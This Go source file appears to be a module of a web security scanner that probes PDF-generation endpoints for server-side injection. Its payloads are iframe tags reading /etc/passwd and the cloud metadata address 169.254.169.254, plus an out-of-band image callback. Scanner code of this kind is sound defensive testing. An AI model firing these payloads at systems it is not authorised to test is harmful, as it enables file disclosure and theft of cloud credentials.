package modules

import (
	"context"
	"fmt"
	"strings"
)

var pdfParamHints = []string{
	"pdf", "html", "content", "template", "report", "invoice", "document",
	"render", "convert", "export", "print", "body", "page",
}

func (r *Runner) runPDFInjection(ctx context.Context, target ScanTarget) []ModuleFinding {
	if ok, reason := r.shouldRunModule("pdf_injection", target); !ok {
		r.emitSkip("pdf_injection", target, reason)
		return nil
	}

	lowerParam := strings.ToLower(target.Parameter)
	isCandidate := false
	for _, hint := range pdfParamHints {
		if strings.Contains(lowerParam, hint) {
			isCandidate = true
			break
		}
	}
	if !isCandidate && target.Parameter != "" {
		// Also allow if endpoint URL contains pdf/render
		lowerURL := strings.ToLower(target.EndpointURL)
		if strings.Contains(lowerURL, "pdf") || strings.Contains(lowerURL, "render") || strings.Contains(lowerURL, "export") {
			isCandidate = true
		}
	}
	if !isCandidate {
		return nil
	}

	baseline, baselineErr := r.cachedEmptyProbe(ctx, target)
	if baselineErr != nil {
		return nil
	}

	var out []ModuleFinding

	// Test 1: Local File Read via <iframe> in PDF
	lfiPayload := `<iframe src="file:///etc/passwd"></iframe>`
	lfiRR, err := r.probe(ctx, target, lfiPayload)
	if err == nil && lfiRR.Response.StatusCode == 200 {
		body := lfiRR.Response.Body
		if strings.Contains(body, "root:x:0:0:") || strings.Contains(body, "[boot loader]") {
			signal := "pdf_local_file_read"
			p := defaultPayload("pdf_injection", signal, lfiPayload, signal)
			f := r.verifyAndBuild(ctx, "pdf_injection", target, p, baseline, lfiRR, signal, false, false, "", "")
			if f != nil {
				f.Severity = "critical"
				f.Title = "Server-Side PDF Generation Local File Inclusion (LFI)"
				f.Description = fmt.Sprintf("PDF generation endpoint '%s' rendered local system files via iframe injection in parameter '%s'.", target.EndpointURL, target.Parameter)
				r.recordFinding(ctx, &out, f, "pdf_injection", signal)
				return out
			}
		}
	}

	// Test 2: Cloud Metadata SSRF via <iframe> / <img> in PDF
	metaPayload := `<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>`
	metaRR, mErr := r.probe(ctx, target, metaPayload)
	if mErr == nil && metaRR.Response.StatusCode == 200 {
		body := metaRR.Response.Body
		if strings.Contains(body, "ami-id") || strings.Contains(body, "instance-id") || strings.Contains(body, "local-hostname") {
			signal := "pdf_metadata_ssrf"
			p := defaultPayload("pdf_injection", signal, metaPayload, signal)
			f := r.verifyAndBuild(ctx, "pdf_injection", target, p, baseline, metaRR, signal, false, false, "", "")
			if f != nil {
				f.Severity = "critical"
				f.Title = "Server-Side PDF Generation Cloud Metadata SSRF"
				f.Description = fmt.Sprintf("PDF generation endpoint '%s' fetched and rendered cloud instance metadata via parameter '%s'.", target.EndpointURL, target.Parameter)
				r.recordFinding(ctx, &out, f, "pdf_injection", signal)
				return out
			}
		}
	}

	// Test 3: OAST Out-of-band SSRF
	if r.cfg.EnableOAST && r.oast != nil {
		if oastURL := strings.TrimSpace(r.oastURL(ctx, "pdf-ssrf", target, "pdf_injection")); oastURL != "" {
			r.sendOASTProbe(ctx, target, oastURL)
			oastPayload := fmt.Sprintf(`<img src="http://%s/pdf-ssrf">`, oastURL)
			_, _ = r.probe(ctx, target, oastPayload)
		}
	}

	return out
}

func pdfInjectionSignalConfirmed(signal, body string, status int) bool {
	if status != 200 {
		return false
	}
	switch signal {
	case "pdf_local_file_read":
		return strings.Contains(body, "root:x:0:0:") || strings.Contains(body, "[boot loader]")
	case "pdf_metadata_ssrf":
		return strings.Contains(body, "ami-id") || strings.Contains(body, "instance-id") ||
			strings.Contains(body, "local-hostname")
	default:
		return false
	}
}
